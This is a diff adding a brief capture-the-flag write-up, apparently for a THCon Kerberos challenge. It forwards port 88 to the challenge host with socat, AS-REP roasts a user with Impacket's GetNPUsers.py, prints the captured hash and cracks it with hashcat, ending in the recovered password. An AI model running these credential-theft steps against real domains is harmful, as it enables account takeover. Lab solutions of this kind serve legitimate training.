@@ -1,0 +1,13 @@
+sudo socat TCP-LISTEN:88,fork TCP:remote1.thcon.party:10288
+
+echo 'thcon1' > users.txt
+
+GetNPUsers.py -dc-ip 127.0.0.1 -request 'thcon.local/' -usersfile users.txt -format hashcat -outputfile hash.txt
+```
+$krb5asrep$23$thcon1@THCON.LOCAL:0cfa10a5f8a8c9dc1b3ef2e4a6323290$b83bf6cb8c517b35d7394db5c7f0411661cb4792b1692c1a75473920b3dc7925f1bed1a8cee3d2e0f1466b270480bca0c0c948f7c076feabd091b30cc6aca77bdede7c513c914e534faa01cf5acc2c96ccefe9ec7c877fcf124c36e0d48837f25374e6f1657c7ff7dff78f266c0a6aa39e8b1bc1a1cc73f76ee5e38f563cd9bb57262374ecc3188c6dd97c4764214ee3e411bd1696f9202f4504ad0d5f5bd36ec4a7a0994982a9216f6c56207f4b5940fe18661696eb7bbc4ae6d65f21a29483e48cfc80ee7ddbc76ebd934b1d38ebf193d4c3e85bd55e7888c901fd055af64d6a7d12985f03c222489b
+```
+
+./hashcat.bin -m 18200 /home/lai/leo/thc/Windows/Kerberos_Part_1/hash.txt /usr/share/wordlists/rockyou.txt
+```
+Thclvr19
+```
